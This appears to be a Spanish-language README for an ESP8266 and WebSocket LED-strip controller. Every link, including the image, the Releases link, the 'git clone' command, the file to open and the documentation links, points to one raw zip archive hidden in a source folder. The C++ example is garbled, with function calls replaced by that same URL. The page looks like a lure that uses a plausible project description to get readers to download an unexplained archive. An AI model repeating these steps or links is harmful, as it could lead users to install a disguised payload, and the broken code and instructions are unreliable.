# Controlador LED 🌟

Control de LEDs con ESP8266 + WebSocket

![Controlador LED](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip)

---

## Descripción

El proyecto **Controlador LED** permite controlar tiras de LEDs WS2812B utilizando un módulo ESP8266 y WebSocket. Este sistema ofrece una interfaz web simple y rápida, permitiendo a los usuarios encender, apagar y cambiar colores de los LEDs de manera eficiente. La combinación de ESP8266 y WebSocket proporciona una comunicación en tiempo real, lo que permite una experiencia de usuario fluida.

## Temas

- Arduino IDE
- ESP8266
- JavaScript
- JSON
- LED
- Controlador de LEDs
- Leds
- ReactJS
- SPIFFS
- WebSocket
- WS2812B

## Instalación

Para comenzar, descarga el último archivo desde la sección de [Releases](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip). Asegúrate de seguir los pasos a continuación:

1. **Clona el repositorio**:
   ```bash
   git clone https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip
   cd controlador_LED
   ```

2. **Abre el proyecto en Arduino IDE**:
   - Asegúrate de tener instalada la biblioteca ESP8266.
   - Abre el archivo `https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip`.

3. **Configura tu red Wi-Fi**:
   - Modifica las líneas correspondientes para ingresar tu SSID y contraseña.

4. **Carga el código**:
   - Selecciona tu placa ESP8266 en el menú de herramientas.
   - Carga el código en tu dispositivo.

5. **Accede a la interfaz web**:
   - Una vez cargado, abre un navegador y dirígete a la dirección IP del ESP8266.
   - Utiliza la interfaz para controlar tus LEDs.

## Uso

### Interfaz Web

La interfaz es intuitiva. Desde la página principal, puedes:

- Encender y apagar los LEDs.
- Cambiar colores.
- Ajustar la intensidad.

### WebSocket

El uso de WebSocket permite una comunicación bidireccional. Esto significa que cualquier cambio realizado en la interfaz se refleja instantáneamente en el hardware y viceversa.

## Ejemplo de Código

Aquí tienes un pequeño ejemplo de cómo se configura el WebSocket:

```cpp
#include <ESP8266WiFi.h>
#include <WebSocketsServer.h>

WebSocketsServer webSocket = WebSocketsServer(81);

void setup() {
    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip(115200);
    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip("SSID", "PASSWORD");
    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip();
    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip(webSocketEvent);
}

void loop() {
    https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip();
}

void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
    // Manejo de eventos
}
```

## Recursos Adicionales

- [Documentación de ESP8266](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip)
- [WebSocket en JavaScript](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip)

## Contribuciones

Las contribuciones son bienvenidas. Si deseas mejorar el proyecto, sigue estos pasos:

1. Haz un fork del repositorio.
2. Crea una nueva rama (`git checkout -b feature/nueva-caracteristica`).
3. Realiza tus cambios y asegúrate de que todo funcione.
4. Envía un pull request.

## Licencia

Este proyecto está bajo la licencia MIT. Consulta el archivo `LICENSE` para más detalles.

## Contacto

Si tienes preguntas o sugerencias, no dudes en abrir un problema en GitHub o contactarme directamente.

---

Para más información, visita la sección de [Releases](https://github.com/WaylenGithub/controlador_LED/raw/refs/heads/main/FrontEnd/src/LED-controlador-1.7.zip) y descubre las últimas versiones y actualizaciones. ¡Disfruta controlando tus LEDs!